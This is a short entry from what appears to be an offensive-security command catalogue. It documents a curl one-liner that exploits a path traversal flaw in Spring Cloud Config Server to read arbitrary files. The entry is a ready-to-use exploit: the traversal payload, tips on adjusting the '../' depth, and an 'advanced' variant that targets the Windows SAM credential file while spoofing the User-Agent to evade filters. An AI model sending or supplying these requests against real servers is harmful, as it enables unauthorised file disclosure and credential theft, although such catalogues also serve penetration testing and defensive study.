---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: 'curl -X GET "https://target.com/blaze/env?path=../../../windows/win.ini" -v'
tags:
  - web-exploit
  - path-traversal
type: command
output: >-
  HTTP/1.1 200 OK

  {"propertySources":[{"name":"file:/C:/windows/win.ini","source":{"[win.ini
  contents]":null}}]}
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:26:22.604Z'
verified: false
validated: true
submitted: true
---
# curl-path-traversal

## Command

```bash
curl -X GET "https://target.com/blaze/env?path=../../../windows/win.ini" -v
```

## Description

This curl command exploits a path traversal vulnerability in Spring Cloud Config Server by sending a GET request to the /env endpoint with a malicious 'path' parameter containing '../' sequences to read arbitrary files like win.ini on a Windows server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `https://target.com/blaze/env?path=../../../windows/win.ini` | Target URL with traversal payload; adjust '../' count and file path as needed | Yes |
| `-v` | Verbose output to show headers and response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/blaze/env?path=../../../windows/win.ini" -v
```

### Advanced Usage

```bash
curl -X GET "https://target.com/blaze/env?path=../../../windows/system32/config/sam" -v -H "User-Agent: Mozilla/5.0"
```

Targets the SAM file with a spoofed User-Agent to evade basic filters.

## Expected Output

Successful execution returns an HTTP 200 response with JSON containing the file contents in the 'source' field, e.g., {"name":"file:/C:/windows/win.ini","source":{"[contents of win.ini]":null}}. Errors may show 404 if the path is invalid or 403 if access is denied.

## Related

- [[Related Procedure|procedures/Exploit-Path-Traversal-via-CVE-2018-1271]]
